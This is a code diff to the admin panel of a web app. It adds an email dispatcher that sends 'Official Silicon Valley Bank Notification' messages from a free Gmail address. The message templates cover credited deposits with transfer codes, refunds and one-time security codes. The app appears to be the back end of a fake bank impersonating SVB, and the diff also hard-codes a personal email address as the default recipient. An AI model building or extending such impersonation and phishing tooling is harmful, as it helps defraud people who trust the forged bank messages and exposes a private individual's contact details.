@@ -20,7 +20,7 @@ import {
   playAdminAlertChime, 
   requestAdminNotificationPermission 
 } from '../services/adminAlerts';
-import { ShieldAlert, Users, Sparkles, FileText, Headphones, Search, UserCheck, Shield, DollarSign, ArrowUpRight, CheckCircle2, XCircle, Clock, Key, ArrowDownRight, Ban, ShieldCheck, UserPlus, X, Plus, Bell, Volume2, VolumeX, Radio, Zap, Check, Filter, AlertCircle, RefreshCw, Send, CheckSquare, Eye, ArrowLeft } from 'lucide-react';
+import { ShieldAlert, Users, Sparkles, FileText, Headphones, Search, UserCheck, Shield, DollarSign, ArrowUpRight, CheckCircle2, XCircle, Clock, Key, ArrowDownRight, Ban, ShieldCheck, UserPlus, X, Plus, Bell, Volume2, VolumeX, Radio, Zap, Check, Filter, AlertCircle, RefreshCw, Send, CheckSquare, Eye, ArrowLeft, Mail } from 'lucide-react';
 
 interface AdminPanelProps {
   adminUser: User;
@@ -29,7 +29,7 @@ interface AdminPanelProps {
 }
 
 export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSuccess, onBack }) => {
-  const [subTab, setSubTab] = useState<'pending' | 'users' | 'funding' | 'crypto' | 'withdraw' | 'audit' | 'support' | 'verifications'>('pending');
+  const [subTab, setSubTab] = useState<'pending' | 'users' | 'funding' | 'crypto' | 'withdraw' | 'audit' | 'support' | 'verifications' | 'email'>('pending');
   const [users, setUsers] = useState<User[]>([]);
   const [searchQuery, setSearchQuery] = useState('');
   const [loadingUsers, setLoadingUsers] = useState(false);
@@ -356,7 +356,53 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
     if (subTab === 'pending' || subTab === 'withdraw') fetchSysTxns();
     if (subTab === 'crypto') fetchCryptoDeposits();
     if (subTab === 'verifications') fetchVerifications();
+    if (subTab === 'email') fetchEmailStatus();
   }, [subTab]);
+
+  // Email Service Status & Live Dispatch State
+  const [emailStatus, setEmailStatus] = useState<{
+    activeProvider: string;
+    senderEmail: string;
+    providersConfigured: { resend: boolean; brevo: boolean; sendgrid: boolean; smtp: boolean };
+  } | null>(null);
+  const [testEmailRecipient, setTestEmailRecipient] = useState('stephengarethchappell15@gmail.com');
+  const [testEmailType, setTestEmailType] = useState<'welcome' | 'deposit' | 'rejected' | 'security'>('deposit');
+  const [testEmailSubject, setTestEmailSubject] = useState('Official Silicon Valley Bank Notification');
+  const [sendingTestEmail, setSendingTestEmail] = useState(false);
+  const [testEmailResult, setTestEmailResult] = useState<{ success: boolean; message: string } | null>(null);
+
+  const fetchEmailStatus = async () => {
+    try {
+      const res = await api.getEmailStatus();
+      if (res) setEmailStatus(res);
+    } catch (e) {
+      console.warn('Failed to fetch email status:', e);
+    }
+  };
+
+  const handleSendTestEmail = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!testEmailRecipient) {
+      showToast('error', 'Validation Error', 'Recipient email address is required.');
+      return;
+    }
+    setSendingTestEmail(true);
+    setTestEmailResult(null);
+    try {
+      const res = await api.sendTestEmail({
+        toEmail: testEmailRecipient.trim(),
+        subject: testEmailSubject.trim(),
+        type: testEmailType
+      });
+      setTestEmailResult({ success: true, message: res?.message || `Test email dispatched to ${testEmailRecipient}` });
+      showToast('success', 'Email Sent', `Transactional email dispatched from siliconvalleybank51@gmail.com to ${testEmailRecipient}`);
+    } catch (err: any) {
+      setTestEmailResult({ success: false, message: err?.message || 'Failed to dispatch email.' });
+      showToast('error', 'Delivery Error', err?.message || 'Failed to dispatch test email.');
+    } finally {
+      setSendingTestEmail(false);
+    }
+  };
 
   const handleApproveVerif = (verif: Tier3VerificationRequest) => {
     setApproveVerifModal(verif);
@@ -874,6 +920,16 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
                   </span>
                 );
               })()}
+            </button>
+
+            <button
+              onClick={() => setSubTab('email')}
+              className={`flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all ${
+                subTab === 'email' ? 'bg-amber-500 text-slate-950 shadow-md font-bold' : 'text-slate-400 hover:text-white'
+              }`}
+            >
+              <Mail className="w-3.5 h-3.5" />
+              <span>Email Service</span>
             </button>
           </div>
         </div>
@@ -1959,6 +2015,147 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
       {/* Sub-Tab 6: Global Support Ticket Manager */}
       {subTab === 'support' && (
         <CustomerSupportPanel user={adminUser} initialUserEmail={supportSearchEmail} />
+      )}
+
+      {/* Sub-Tab 7: Real Transactional Email Dispatcher & Service Status */}
+      {subTab === 'email' && (
+        <div className="bg-slate-900 border border-slate-800 rounded-3xl p-4 sm:p-6 shadow-xl space-y-6">
+          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
+            <div>
+              <div className="flex items-center gap-2">
+                <div className="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
+                  <Mail className="w-5 h-5" />
+                </div>
+                <div>
+                  <h3 className="text-base font-bold text-white">Transactional Email Delivery Engine</h3>
+                  <p className="text-xs text-slate-400">Official Sender: <span className="text-amber-400 font-semibold">siliconvalleybank51@gmail.com</span></p>
+                </div>
+              </div>
+            </div>
+            <button
+              onClick={fetchEmailStatus}
+              className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold border border-slate-700 flex items-center gap-1.5 transition-all cursor-pointer"
+            >
+              <RefreshCw className="w-3.5 h-3.5" />
+              <span>Refresh Status</span>
+            </button>
+          </div>
+
+          {/* Email Infrastructure Status Cards */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 space-y-1">
+              <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Active Mailer Provider</span>
+              <div className="flex items-center gap-2 pt-1">
+                <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
+                <span className="text-sm font-bold text-white">{emailStatus?.activeProvider || 'Direct / Fallback Dispatcher'}</span>
+              </div>
+              <p className="text-[11px] text-slate-500 pt-0.5">Automated fail-safe transactional delivery active.</p>
+            </div>
+
+            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 space-y-1">
+              <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Configured Sender Address</span>
+              <div className="flex items-center gap-2 pt-1">
+                <Mail className="w-4 h-4 text-amber-400 shrink-0" />
+                <span className="text-xs font-mono font-bold text-amber-300 break-all">{emailStatus?.senderEmail || 'siliconvalleybank51@gmail.com'}</span>
+              </div>
+              <p className="text-[11px] text-slate-500 pt-0.5">Used for receipts, alerts, approvals & rejections.</p>
+            </div>
+
+            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 space-y-1">
+              <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Delivery Resilience</span>
+              <div className="flex items-center gap-2 pt-1">
+                <ShieldCheck className="w-4 h-4 text-emerald-400" />
+                <span className="text-sm font-bold text-emerald-400">Non-Blocking Fire-and-Forget</span>
+              </div>
+              <p className="text-[11px] text-slate-500 pt-0.5">Transactions never fail or freeze if SMTP latency occurs.</p>
+            </div>
+          </div>
+
+          {/* Test Email Dispatch Form */}
+          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
+            <div>
+              <h4 className="text-sm font-bold text-white flex items-center gap-2">
+                <Send className="w-4 h-4 text-amber-400" />
+                <span>Send Live Test Transactional Email</span>
+              </h4>
+              <p className="text-xs text-slate-400 mt-0.5">
+                Dispatch an official SVB notification directly to an inbox to verify formatting and delivery.
+              </p>
+            </div>
+
+            <form onSubmit={handleSendTestEmail} className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label className="block text-xs font-medium text-slate-300 mb-1">Target Recipient Email Address</label>
+                  <input
+                    type="email"
+                    required
+                    value={testEmailRecipient}
+                    onChange={(e) => setTestEmailRecipient(e.target.value)}
+                    placeholder="e.g. client@example.com"
+                    className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-amber-500"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-slate-300 mb-1">Transactional Template Type</label>
+                  <select
+                    value={testEmailType}
+                    onChange={(e: any) => setTestEmailType(e.target.value)}
+                    className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-amber-500"
+                  >
+                    <option value="deposit">Deposit Credited & 4-Digit Transfer Code Issued</option>
+                    <option value="rejected">Transaction Rejected & Refund Processed</option>
+                    <option value="welcome">New Account Registration & Welcome</option>
+                    <option value="security">Security Alert / One-Time Authorization Code</option>
+                  </select>
+                </div>
+              </div>
+
+              <div>
+                <label className="block text-xs font-medium text-slate-300 mb-1">Custom Subject Line (Optional)</label>
+                <input
+                  type="text"
+                  value={testEmailSubject}
+                  onChange={(e) => setTestEmailSubject(e.target.value)}
+                  placeholder="Official Silicon Valley Bank Notification"
+                  className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-amber-500"
+                />
+              </div>
+
+              {testEmailResult && (
+                <div className={`p-3.5 rounded-xl border text-xs flex items-center gap-2.5 ${
+                  testEmailResult.success 
+                    ? 'bg-emerald-950/40 border-emerald-500/30 text-emerald-300' 
+                    : 'bg-rose-950/40 border-rose-500/30 text-rose-300'
+                }`}>
+                  {testEmailResult.success ? <CheckCircle2 className="w-4 h-4 shrink-0 text-emerald-400" /> : <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />}
+                  <span>{testEmailResult.message}</span>
+                </div>
+              )}
+
+              <div className="flex justify-end pt-1">
+                <button
+                  type="submit"
+                  disabled={sendingTestEmail}
+                  className="px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 text-slate-950 font-bold text-xs flex items-center gap-2 transition-all cursor-pointer shadow-lg shadow-amber-500/20"
+                >
+                  {sendingTestEmail ? (
+                    <>
+                      <RefreshCw className="w-4 h-4 animate-spin" />
+                      <span>Dispatching Email...</span>
+                    </>
+                  ) : (
+                    <>
+                      <Send className="w-4 h-4" />
+                      <span>Send Test Email from siliconvalleybank51@gmail.com</span>
+                    </>
+                  )}
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
       )}
 
       {/* Create User Account Modal */}
